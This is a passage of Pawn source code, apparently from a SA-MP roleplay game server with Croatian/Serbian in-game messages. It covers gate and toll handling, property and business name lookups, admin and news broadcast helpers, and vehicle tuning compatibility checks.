		    MoveDynamicObject( GateData[ gateid ][ gateObject ], GateData[ gateid ][ gateMove ][ 0 ], GateData[ gateid ][ gateMove ][ 1 ], GateData[ gateid ][ gateMove ][ 2 ], GateData[ gateid ][ gateSpeed ], GateData[ gateid ][ gateMove ][ 3 ], GateData[ gateid ][ gateMove ][ 4 ], GateData[ gateid ][ gateMove ][ 5 ] );

            if( GetPlayerInterior( playerid ) != 0 )
			{
                if( GetFactionType( playerid ) == ORG_TIP_VLADINA )
				{
                    SCMF( playerid, ZUTA, "(VRATA): Otvorili ste vrata, zatvoriti ce se automatski za {FFFFFF}(%d) {FFFF00}sekundi.", GateData[ gateid ][ gateTime ]/1000 );
				}
				else
				{
				    SCMF( playerid, ZUTA, "(PROLAZ): Pritisnuli ste tajni gumb i otvorili prolaz u tajnu sobu, zatvaranje za {FFFFFF}(%d) {FFFF00}sekundi.", GateData[ gateid ][ gateTime ]/1000 );
				}
		    }
		    else if(GateData[ gateid ][ gateFor ] == 8)
		    {
		    	SCMF(playerid, ZUTA, "(PUTARINA): Platili ste putarinu {FFFFFF}200$ {FFFF00}i zatvoriti ce se za {FFFFFF}(%d) {FFFF00}sekundi.", GateData[ gateid ][ gateTime ]/1000);
		    	DajIgracuNovac(playerid, -200);
		    }
            else
			{
				SCMF( playerid, ZUTA, "(KAPIJA): Otvorili ste kapiju, zatvoriti ce se automatski za {FFFFFF}(%d) {FFFF00}sekundi.", GateData[ gateid ][ gateTime ]/1000 );
			}

            if( GateData[ gateid ][ gateTime ] > 0 )
			{
				GateData[ gateid ][ gateTimer ] = SetPlayerTimerEx(playerid, "CloseGate", GateData[gateid][gateTime], false, "ifffifff", gateid, GateData[gateid][gatePos][0], GateData[gateid][gatePos][1], GateData[gateid][gatePos][2], GateData[gateid][gateSpeed], GateData[gateid][gatePos][3], GateData[gateid][gatePos][4], GateData[gateid][gatePos][5]);
			}
		}
		else
		{
			if(GateData[ gateid ][ gateFor ] == 8)
			{
				SendErrorMessage(playerid, "Putarina ce se zatvoriti sama.");
				return 1;
			}

		    GateData[ gateid ][ gateOpened ] = false;
		    MoveDynamicObject( GateData[ gateid ][ gateObject ], GateData[ gateid ][ gatePos ][ 0 ], GateData[ gateid ][ gatePos ][ 1 ], GateData[ gateid ][ gatePos ][ 2 ], GateData[ gateid ][ gateSpeed ], GateData[ gateid ][ gatePos ][ 3 ], GateData[ gateid ][ gatePos ][ 4 ], GateData[ gateid ][ gatePos ][ 5 ] );

            if( GetPlayerInterior( playerid ) != 0 )
			{
                if( GetFactionType( playerid ) == ORG_TIP_VLADINA ) SendClientMessage( playerid, ZUTA, "(VRATA): Zatvorili ste vrata." );
				else SendClientMessage( playerid, ZUTA, "(PROLAZ): Pritisnuli ste tajnu gumb i zatvorili prolaz u tajnu sobu." );
			}
            else SendClientMessage( playerid, ZUTA, "(KAPIJA): Zatvorili ste kapiju." );

            if( GateData[ gateid ][ gateTime ] > 0 ) KillTimer(GateData[ gateid ][ gateTimer ]);
		}
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public CloseGate(gateid, Float:fX, Float:fY, Float:fZ, Float:speed, Float:fRotX, Float:fRotY, Float:fRotZ)
{
	if( GateData[ gateid ][ gateModel ] && GateData[ gateid ][ gateOpened ] )
	{
	 	MoveDynamicObject( GateData[ gateid ][ gateObject ], fX, fY, fZ, speed, fRotX, fRotY, fRotZ );

		GateData[ gateid ][ gateOpened ] = false;
		return 1;
	}
	return 0;
}
//------------------------------------------------------------------------------
GetNearestProperty(playerid) 
{
	new Float:p_Pos[3], Float:maxradius = 3.0, id = -1;
	GetPlayerPos(playerid, p_Pos[0], p_Pos[1], p_Pos[2]);

    foreach(new i : iter_Imovina)
    {
        if(VectorSize(p_Pos[0] - II[i][iEnter][0], p_Pos[1] - II[i][iEnter][1], p_Pos[2] - II[i][iEnter][2]) >= maxradius) continue;

        id = i;
        maxradius = VectorSize(p_Pos[0] - II[i][iEnter][0], p_Pos[1] - II[i][iEnter][1], p_Pos[2] - II[i][iEnter][2]);
    }
    return id;
}
//------------------------------------------------------------------------------
GetPropertyName( i )
{
	new pName[20] = "Nepostojeca";

    if( i == -1 || i == 0 ) format( pName, sizeof( pName ), "%s", "Nema nekretnine" );
	else if( i != -1 )
	{
		switch( II[ i ][ iUsage ] )
		{
			case IMOVINA_KUCA: pName = "Kucu";
			case IMOVINA_STAN: pName = "Stan";
			case IMOVINA_VIKENDICA: pName = "Vikendicu";
		}
	}
	return pName;
}

GetPropertyAName( i )
{
	new pName[20] = "Nepostojeca";

    if( i == -1 || i == 0 ) format( pName, sizeof( pName ), "%s", "Prazno" );
	else if( i != -1 )
	{
		switch( II[ i ][ iUsage ] )
		{
			case IMOVINA_KUCA: pName = "Kuca";
			case IMOVINA_STAN: pName = "Stan";
			case IMOVINA_VIKENDICA: pName = "Vikendica";
		}
	}
	return pName;
}
//------------------------------------------------------------------------------
getBussinesType( f )
{
	new jobName[20] = "Nepostojeci";

	switch( BusinessInfo[ f ][ bType ] )
	{
		case VRSTA_RESTORAN: jobName = "Restoran";
		case VRSTA_CLUCK: jobName = "Cluckin' Bell";
		case VRSTA_ZIP: jobName = "Zip";
		case VRSTA_BINCO: jobName = "Binco";
		case VRSTA_SUBURBAN: jobName = "Suburban";
		case VRSTA_VICTIM: jobName = "Victim";
		case VRSTA_BAR: jobName = "Bar";
		case VRSTA_NKLUB: jobName = "Nocni Klub";
		case VRSTA_DISCO: jobName = "Diskoteka";
		case VRSTA_GUNSHOP: jobName = "Ammunation";
		case VRSTA_PIZZA: jobName = "Picerija";
		case VRSTA_BURG: jobName = "Burg";
		case VRSTA_MARKET: jobName = "Prodavnica 24/7";
		case VRSTA_GYM: jobName = "Teretana";
		case VRSTA_ELEKTRONIK: jobName = "Elektronik";
		case VRSTA_TRAFIKA: jobName = "Trafika";
		case VRSTA_POSAO: jobName = "Poslovna firma";
		case VRSTA_RENT: jobName = "Rent a vehicle";
		case VRSTA_JAVNAK: jobName = "Javna Kuca";
		case VRSTA_KLAD: jobName = "Kladionica";
		case VRSTA_OGLAS: jobName = "Oglas";
		case VRSTA_LUTRIJA: jobName = "Lutrija";
		case VRSTA_CASINO: jobName = "Casino";
	}
	return jobName;
}
//------------------------------------------------------------------------------
OOCNews(color, const text[], {Float,_}:...)
{
	static
  	    args,
	    str[192];

	if((args = numargs()) <= 2)
	{
	    foreach( new i : Player)
		{
			if( PlayerLogged[ i ] == true )
			{
			    if( !gNews{ i } )
				{
					SendClientMessage( i, color, text );
				}
			}
		}
	}
	else
	{
		while(--args >= 2)
		{
			#emit LCTRL 	5
			#emit LOAD.alt 	args
			#emit SHL.C.alt 2
			#emit ADD.C 	12
			#emit ADD
			#emit LOAD.I
			#emit PUSH.pri
		}
		#emit PUSH.S 		text
		#emit PUSH.C 		192
		#emit PUSH.C 		str
		#emit LOAD.S.pri 	8
		#emit ADD.C 		4
		#emit PUSH.pri
		#emit SYSREQ.C 		format
		#emit LCTRL 		5
		#emit SCTRL 		4

		foreach( new i : Player)
		{
			if( PlayerLogged[ i ] == true )
			{
			    if( !gNews{ i } )
				{
					SendClientMessage( i, color, str );
				}
			}
		}

		#emit RETN
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public PoredTrafike( playerid )
{
	if( IsPlayerInRangeOfPoint( playerid, 3.0, 1420.0414,-1722.5942,13.5469 )   ||
		IsPlayerInRangeOfPoint( playerid, 3.0, 1513.5792,-2286.3040,13.5469 )   ||
		IsPlayerInRangeOfPoint( playerid, 3.0, 1699.0959,-1311.4446,13.6361 )   ||
		IsPlayerInRangeOfPoint( playerid, 3.0, 1536.0206,-1037.9900,23.8038 )   ||
		IsPlayerInRangeOfPoint( playerid, 3.0, 1175.1951,-935.0350,43.0684 )    ||
		IsPlayerInRangeOfPoint( playerid, 3.0, 1196.2822,-1274.7947,13.5469 )   ||
		IsPlayerInRangeOfPoint( playerid, 3.0, 1191.6115,-1706.1720,13.5469 )   ||
		IsPlayerInRangeOfPoint( playerid, 3.0, 338.9061,-1771.3350,5.1622 )     ||
		IsPlayerInRangeOfPoint( playerid, 3.0, 2263.6519,-1308.8433,23.9844 ))
	{
		return 1;
	}
	return 0;
}
//------------------------------------------------------------------------------
Kickovanje(id, const text[], {Float, _}:...)
{
	static
  	    args,
	    str[192];

	if((args = numargs()) <= 2)
	{
	    SCMF(id, 0xFF0000FF, "#KICK: {FFFFFF}%s", text);
		SetPlayerTimerEx(id, "KickIgraca", 100, false, "i", id);
	}
	else
	{
		while(--args >= 2)
		{
			#emit LCTRL 	5
			#emit LOAD.alt 	args
			#emit SHL.C.alt 2
			#emit ADD.C 	12
			#emit ADD
			#emit LOAD.I
			#emit PUSH.pri
		}
		#emit PUSH.S 		text
		#emit PUSH.C 		192
		#emit PUSH.C 		str
		#emit LOAD.S.pri 	8
		#emit ADD.C 		4
		#emit PUSH.pri
		#emit SYSREQ.C 		format
		#emit LCTRL 		5
		#emit SCTRL 		4

		SCMF(id, 0xFF0000FF, "#KICK: {FFFFFF}%s", str);
		SetPlayerTimerEx(id, "KickIgraca", 100, false, "i", id);

		#emit RETN
	}
	return 1;
}
//------------------------------------------------------------------------------
DodajWarnRed(const fmat[], {Float, _}:...) 
{
    static 
    	output[128], 
    	frm_header[3];

    const output_size = sizeof(output);

    #emit LCTRL      	5
    #emit CONST.alt  	frm_header
    #emit MOVS       	12
    #emit ADD.C    		12
    #emit SCTRL    		4
    #emit PUSH.C      	output_size
    #emit PUSH.C      	output
    #emit LOAD.S.pri  	8
    #emit ADD.C       	8
    #emit PUSH.pri
    #emit SYSREQ.C    	format
    #emit LCTRL       	5
    #emit SCTRL       	4
    #emit MOVE.alt
    #emit CONST.pri   	frm_header
    #emit MOVS        	12
    #emit LOAD.S.pri  	8
    #emit ADD.C       	12
    #emit MOVE.alt
    #emit LCTRL       	5
    #emit ADD
    #emit LOAD.I
    #emit STOR.S.pri  	20

    foreach(new i : Player) 
    {
        if((PlayerInfo[i][xAdmin] > 0 || PlayerInfo[i][xSpecAdmin] > 0) && ALTPoruke[i] == true) SendAltChatMessage(i, output);
    }
    #pragma unused fmat
}
//------------------------------------------------------------------------------
_:public UnLockCar(carid)
{
    new engine, lights, alarm, doors, bonnet, boot, objective;

	GetVehicleParamsEx(carid, engine, lights, alarm, doors, bonnet, boot, objective);
    SetVehicleParamsEx(carid, engine, lights, alarm, 0, bonnet, boot, objective);
    return 1;
}
//------------------------------------------------------------------------------
_:public IsComponentidCompatible( modelid, componentid )
{
    if( componentid == 1025 || componentid == 1073 || componentid == 1074 || componentid == 1075 || componentid == 1076 ||
		componentid == 1077 || componentid == 1078 || componentid == 1079 || componentid == 1080 || componentid == 1081 ||
        componentid == 1082 || componentid == 1083 || componentid == 1084 || componentid == 1085 || componentid == 1096 ||
        componentid == 1097 || componentid == 1098 || componentid == 1087 || componentid == 1086 )
	{
        return componentid;
	}

    switch( modelid )
	{
        case 400: if( componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 ) return componentid;
        case 401: if( componentid == 1005 || componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 114 || componentid == 1020 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 402: if( componentid == 1009 || componentid == 1009 || componentid == 1010 ) return componentid;
        case 404: if( componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1002 || componentid == 1016 || componentid == 1000 || componentid == 1017 || componentid == 1007) return componentid;
        case 405: if( componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1014 || componentid == 1023 || componentid == 1000) return componentid;
        case 409: if( componentid == 1009 ) return componentid;
        case 410: if( componentid == 1019 || componentid == 1021 || componentid == 1020 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 411: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 412: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 415: if( componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 418: if( componentid == 1020 || componentid == 1021 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1016) return componentid;
        case 419: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 420: if( componentid == 1005 || componentid == 1004 || componentid == 1021 || componentid == 1019 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1003) return componentid;
        case 421: if( componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1014 || componentid == 1023 || componentid == 1016 || componentid == 1000) return componentid;
        case 422: if( componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1017 || componentid == 1007) return componentid;
        case 426: if( componentid == 1005 || componentid == 1004 || componentid == 1021 || componentid == 1019 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1003) return componentid;
        case 429: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 436: if( componentid == 1020 || componentid == 1021 || componentid == 1022 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 438: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 439: if( componentid == 1003 || componentid == 1023 || componentid == 1001 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1017 || componentid == 1007 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1013) return componentid;
        case 442: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 445: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 451: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 458: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 466: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 467: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 474: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 475: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 477: if( componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1017 || componentid == 1007) return componentid;
        case 478: if( componentid == 1005 || componentid == 1004 || componentid == 1012 || componentid == 1020 || componentid == 1021 || componentid == 1022 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 479: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 480: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 489: if( componentid == 1005 || componentid == 1004 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1016 || componentid == 1000) return componentid;
        case 491: if( componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1014 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 492: if( componentid == 1005 || componentid == 1004 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1016 || componentid == 1000) return componentid;
        case 496: if( componentid == 1006 || componentid == 1017 || componentid == 1007 || componentid == 1011 || componentid == 1019 || componentid == 1023 || componentid == 1001 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1003 || componentid == 1002 || componentid == 1142 || componentid == 1143 || componentid == 1020) return componentid;
        case 500: if( componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 506: if( componentid == 1009) return componentid;
        case 507: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 516: if( componentid == 1004 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1002 || componentid == 1015 || componentid == 1016 || componentid == 1000 || componentid == 1017 || componentid == 1007) return componentid;
        case 517: if( componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1002 || componentid == 1023 || componentid == 1016 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 518: if( componentid == 1005 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1018 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 526: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 527: if( componentid == 1021 || componentid == 1020 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1014 || componentid == 1015 || componentid == 1017 || componentid == 1007) return componentid;
        case 529: if( componentid == 1012 || componentid == 1011 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 533: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 534: if( componentid == 1126 || componentid == 1127 || componentid == 1179 || componentid == 1185 || componentid == 1100 || componentid == 1123 || componentid == 1125 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1180 || componentid == 1178 || componentid == 1101 || componentid == 1122 || componentid == 1124 || componentid == 1106) return componentid;
        case 535: if( componentid == 1109 || componentid == 1110 || componentid == 1113 || componentid == 1114 || componentid == 1115 || componentid == 1116 || componentid == 1117 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1120 || componentid == 1118 || componentid == 1121 || componentid == 1119) return componentid;
        case 536: if( componentid == 1104 || componentid == 1105 || componentid == 1182 || componentid == 1181 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1184 || componentid == 1183 || componentid == 1128 || componentid == 1103 || componentid == 1107 || componentid == 1108) return componentid;
        case 540: if( componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007) return componentid;
        case 541: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 542: if( componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1014 || componentid == 1015) return componentid;
        case 545: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 546: if( componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1019 || componentid == 1018 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007) return componentid;
        case 547: if( componentid == 1142 || componentid == 1143 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1016 || componentid == 1003 || componentid == 1000) return componentid;
        case 549: if( componentid == 1012 || componentid == 1011 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 550: if( componentid == 1005 || componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003) return componentid;
        case 551: if( componentid == 1005 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1023 || componentid == 1016 || componentid == 1003) return componentid;
        case 555: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 558: if( componentid == 1092 || componentid == 1089 || componentid == 1166 || componentid == 1165 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1168 || componentid == 1167 || componentid == 1088 || componentid == 1091 || componentid == 1164 || componentid == 1163 || componentid == 1094 || componentid == 1090 || componentid == 1095 || componentid == 1093) return componentid;
        case 559: if( componentid == 1065 || componentid == 1066 || componentid == 1160 || componentid == 1173 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1159 || componentid == 1161 || componentid == 1162 || componentid == 1158 || componentid == 1067 || componentid == 1068 || componentid == 1071 || componentid == 1069 || componentid == 1072 || componentid == 1070 || componentid == 1009) return componentid;
        case 560: if( componentid == 1028 || componentid == 1029 || componentid == 1169 || componentid == 1170 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1141 || componentid == 1140 || componentid == 1032 || componentid == 1033 || componentid == 1138 || componentid == 1139 || componentid == 1027 || componentid == 1026 || componentid == 1030 || componentid == 1031) return componentid;
        case 561: if( componentid == 1064 || componentid == 1059 || componentid == 1155 || componentid == 1157 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1154 || componentid == 1156 || componentid == 1055 || componentid == 1061 || componentid == 1058 || componentid == 1060 || componentid == 1062 || componentid == 1056 || componentid == 1063 || componentid == 1057) return componentid;
        case 562: if( componentid == 1034 || componentid == 1037 || componentid == 1171 || componentid == 1172 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1149 || componentid == 1148 || componentid == 1038 || componentid == 1035 || componentid == 1147 || componentid == 1146 || componentid == 1040 || componentid == 1036 || componentid == 1041 || componentid == 1039) return componentid;
        case 565: if( componentid == 1046 || componentid == 1045 || componentid == 1153 || componentid == 1152 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1150 || componentid == 1151 || componentid == 1054 || componentid == 1053 || componentid == 1049 || componentid == 1050 || componentid == 1051 || componentid == 1047 || componentid == 1052 || componentid == 1048) return componentid;
        case 566: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 567: if( componentid == 1129 || componentid == 1132 || componentid == 1189 || componentid == 1188 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1187 || componentid == 1186 || componentid == 1130 || componentid == 1131 || componentid == 1102 || componentid == 1133) return componentid;
        case 575: if( componentid == 1044 || componentid == 1043 || componentid == 1174 || componentid == 1175 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1176 || componentid == 1177 || componentid == 1099 || componentid == 1042) return componentid;
        case 576: if( componentid == 1136 || componentid == 1135 || componentid == 1191 || componentid == 1190 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1192 || componentid == 1193 || componentid == 1137 || componentid == 1134) return componentid;
        case 579: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 580: if( componentid == 1020 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007) return componentid;
        case 585: if( componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 587: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 589: if( componentid == 1005 || componentid == 1004 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1024 || componentid == 1013 || componentid == 1006 || componentid == 1016 || componentid == 1000 || componentid == 1017 || componentid == 1007) return componentid;
        case 600: if( componentid == 1005 || componentid == 1004 || componentid == 1020 || componentid == 1022 || componentid == 1018 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1017 || componentid == 1007) return componentid;
        case 602: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 603: if( componentid == 1144 || componentid == 1145 || componentid == 1142 || componentid == 1143 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007) return componentid;
    }
    return(false);
}
//==============================================================================
GetVehicleCameraPos( vehicleid, &Float:x, &Float:y, &Float:z, Float:xoff = 0.0, Float:yoff = 0.0, Float:zoff = 0.0 )
{
    new Float:rot;
    GetVehicleZAngle( vehicleid, rot );
    rot = 360 - rot;
    GetVehiclePos( vehicleid, x, y, z );
    x = floatsin( rot, degrees ) * yoff + floatcos( rot, degrees ) * xoff + x;
    y = floatcos( rot, degrees ) * yoff - floatsin( rot, degrees ) * xoff + y;
    z = zoff + z;
}
//==============================================================================
_:public SavePlayerVehicleTuning(autoid, componentid)
{
 	if( IsASpoiler( componentid ) ) VehicleInfo[ autoid ][ vSpoiler ] = componentid;
	else if( IsANitro( componentid ) ) VehicleInfo[ autoid ][ vNitro ] = componentid;
	else if( IsAFrontBumper( componentid ) ) VehicleInfo[ autoid ][ vFrontBumper ] = componentid;
	else if( IsARearBumper( componentid ) ) VehicleInfo[ autoid ][ vRearBumper ] = componentid;
	else if( IsAStereo( componentid ) ) VehicleInfo[ autoid ][ vStereo ] = componentid;
	else if( IsAExhaust( componentid ) ) VehicleInfo[ autoid ][ vExhaust ] = componentid;
	else if( IsALamp( componentid ) ) VehicleInfo[ autoid ][ vLamps ] = componentid;
   	else if( IsAHydraulic( componentid ) ) VehicleInfo[ autoid ][ vHydraulics ] = componentid;
    else if( IsAVents( componentid ) ) VehicleInfo[ autoid ][ vVents ] = componentid;
    else if( IsAHood( componentid ) ) VehicleInfo[ autoid ][ vHood ] = componentid;
	else if( IsAWheel( componentid ) ) VehicleInfo[ autoid ][ vWheels ] = componentid;
	else if( IsARoof( componentid ) ) VehicleInfo[ autoid ][ vRoof ] = componentid;
	else if( IsASkirt( componentid ) ) VehicleInfo[ autoid ][ vSkirt ] = componentid;

	sql_vehicles_update_tuning( autoid );
}
//==============================================================================
_:public IsASkirt( componentid )
{
	if( GetVehicleComponentType( componentid ) == CARMODTYPE_SIDESKIRT ) return 1;
	return(false);
}
//==============================================================================
_:public IsASpoiler( componentid )
{
	if( GetVehicleComponentType( componentid ) == CARMODTYPE_SPOILER ) return 1;
	return(false);
}
//==============================================================================
_:public IsANitro( componentid )
{
	if( GetVehicleComponentType( componentid ) == CARMODTYPE_NITRO ) return 1;
	return(false);
}
//==============================================================================
_:public IsAFrontBumper( componentid )
{
    if( GetVehicleComponentType( componentid ) == CARMODTYPE_FRONT_BUMPER ) return 1;
	return(false);
}
//==============================================================================
_:public IsARearBumper( componentid )
{
    if( GetVehicleComponentType( componentid ) == CARMODTYPE_REAR_BUMPER ) return 1;
	return(false);
}
//==============================================================================
_:public IsAStereo( componentid )
{
	if( GetVehicleComponentType( componentid ) == CARMODTYPE_STEREO ) return 1;
	return(false);
}
//==============================================================================
_:public IsAExhaust( componentid )
{
    if( GetVehicleComponentType( componentid ) == CARMODTYPE_EXHAUST ) return 1;
	return(false);
}
//==============================================================================
_:public IsALamp( componentid )
{
	if( GetVehicleComponentType( componentid ) == CARMODTYPE_LAMPS ) return 1;
	return(false);
}
//==============================================================================
_:public IsAHydraulic( componentid )
{
	if( GetVehicleComponentType( componentid ) == CARMODTYPE_HYDRAULICS ) return 1;
	return(false);
}
//==============================================================================
_:public IsAVents( componentid )
{
	if( GetVehicleComponentType( componentid ) == CARMODTYPE_VENT_RIGHT || GetVehicleComponentType( componentid ) == CARMODTYPE_VENT_LEFT ) return 1;
	return(false);
}
//==============================================================================
_:public IsAHood( componentid )
{
	if( GetVehicleComponentType( componentid ) == CARMODTYPE_HOOD ) return 1;
	return(false);
}
//==============================================================================
_:public IsAWheel( componentid )
{
	if( GetVehicleComponentType( componentid ) == CARMODTYPE_WHEELS ) return 1;
	return(false);
}
//==============================================================================
_:public IsARoof( componentid )
{
	if( GetVehicleComponentType( componentid ) == CARMODTYPE_ROOF ) return 1;
	return(false);
}
//==============================================================================
